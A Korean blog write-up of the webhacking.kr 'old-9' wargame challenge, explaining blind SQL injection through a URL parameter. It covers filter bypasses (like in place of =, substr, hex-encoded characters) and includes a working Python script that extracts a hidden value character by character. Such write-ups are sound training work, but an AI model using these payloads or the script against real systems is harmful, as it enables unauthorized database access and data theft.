---
title: "Webhacking.kr challenge(old) 9th Write-Up"
tags: [database, wargame]
categories: [Web]
---

Webhacking.kr 9 Write-Up
------------------------

## **문제 분석**

이 문제의 경우 많은 걸 배울 수 있던 문제였습니다. 여태까지 해왔던 SQL Injection의 경우 입력 form을 target으로 진행된 반면, 
이번의 경우 정말 blind SQL Injection의 정석이라고 생각될 정도의 문제였습니다.

먼저 문제를 클릭하면 다음과 같은 화면을 먼저 볼 수 있었습니다.

![webhacking_kr_9_main](https://raw.githubusercontent.com/Jun-Project-LAB/Jun-Project-LAB.github.io/main/_image/webhacking_kr_9_main.png)

password를 제출하는 입력칸과 1, 2, 3 각각 hyperlink를 확인할 수 있었습니다. 먼저 각각의 hyperlink를 눌러서 확인해보면 1번은 Apple, 2번은 Banana가 출력되며 
3번의 경우 문제 해결 조건과 관련있을 법한 내용을 출력하였습니다.

![webhacking_kr_9_3](https://raw.githubusercontent.com/Jun-Project-LAB/Jun-Project-LAB.github.io/main/_image/webhacking_kr_9_3.png)

사진을 보면 알 수 있듯이 Secret이라고 되어 있으며 id, no 두 개의 column이 있고 no 3의 id가 password라고 되어 있습니다.

가장 먼저 찾을 수 있던 것은 no에 관한 것인데 hyperlink의 숫자가 URL의 GET 인자로 전달해주는 숫자와 일치하는 것을 확인할 수 있었습니다.

>*https://webhacking.kr/challenge/web-09/?no=3*
3을 눌러서 접속하였을 때의 URL

## **풀이 방법 찾기**

이 이후에 제대로 갈피를 잡지 못하고 main page에서 확인할 수 있던 입력 form에서 SQL Injection을 실시하였으나 이는 해결에 접근할 수 없었습니다.

풀이 방법을 찾아본 결과 입력 form이 아닌 no 인자를 전달하는 곳을 통해서 blind SQL Injection을 수행할 수 있었습니다.

풀이 방법을 보고 정말 정석적인 blind SQL Injection이라고 느끼게 된 점이 no 값에 1 ~ 3이 아닌 다른 값이 전달될 경우 제대로 페이지가 로딩 되지 않는 점을 이용하여 Injection을 수행하는 것이었습니다.

또한 필터링 되는 문자가 있을 경우 Access Denied 라는 문구가 출력되었습니다. 이를 위해서는 if문을 사용하였습니다.

- **if문 구조**

if문의 구조는 if(A, B, C)로 A의 결과가 참일 경우 B를, 거짓일 경우 C를 반환합니다. 이 문제의 경우 B에는 3, C에는 1, 2, 3이 아닌 다른 값을 입력하여 참과 거짓을 구분하였습니다.

여기서 비교를 위한 연산자인 =이 필터링 되어 like를 사용하여 값을 비교하였습니다. 또한 쿼리문에 공백이 있을 경우에도 Access Denied가 출력되었는데 이는 공백을 필터링한 것이 아닌 % 문자가 필터링 되기 때문에 공백이 URL Encoding되어 발생되는 것이었습니다.

따라서 다음과 같은 형식으로 해야 필터링을 우회할 수 있었습니다.

```python
?no=if(length(id)like(0),3,0)
```

이 때 페이지의 html code를 살펴보았을 때 form의 max length가 11이었기에 1부터 11까지를 범위로 잡고 진행하였습니다.

* * *

id의 길이는 11글자였으며 최종적으로 문자열을 알아낼 필요가 있었습니다. 자주 사용되는 함수인 substring을 입력하였을 때는 필터링 되었으나 substr로 입력할 경우 필터링 되지 않았기에 사용할 수 있는 것을 확인할 수 있었습니다.

문제는 %가 필터링 되기 때문에 single quotes와 double quotes도 사용할 수 없었기에 이를 우회할 방법이 필요했습니다. 또한 문자열과 관련되서 자주 사용되는 char, ascii, ord 함수도 모두 필터링 되었기 때문에 다른 방법을 사용할 필요가 있었는데 hex 값을 사용할 경우 query가 가능하다는 것을 알 수 있었습니다.

문자열을 추출하는 과정에서 %와 _ 문자도 포함되어 출력되었는데 이를 위해서 해당 문자들의 경우 생략하도록 작성하였습니다. 또한 대/소문자 구분을 하지 않아서 결과적으로 정상적인 결과는 아닌 값을 알 수 있을 정도의 결과물이 출력되었습니다.

작성한 코드는 다음과 같습니다.

```python
#!/usr/bin/python

import requests as req

url = "https://webhacking.kr/challenge/web-09/"
cookies = {"PHPSESSID":"1sufshmhf7a3l4p5pi8mh8nepq"}
ref = "Secret"
answer = ""

for a in range(1, 11+1):
    params = "?no=if(length(id)like({}),3,0)".format(a)
    requrl = url+params
    response = req.get(requrl, cookies=cookies)
    if ref in response.text:
        print("id length is \"{}\"".format(a))

for i in range(1, 11+1):
    for j in range(33, 126+1):
        if chr(j) == '%' or chr(j) == '_':
            continue
        key = hex(j)
        params = "?no=if(substr(id,{},1)like({}),3,0)".format(i, key)
        requrl = url+params
        response = req.get(requrl, cookies=cookies)
        if ref in response.text:
            answer += chr(j)


print("answer is \"{}\"".format(answer))
``` 
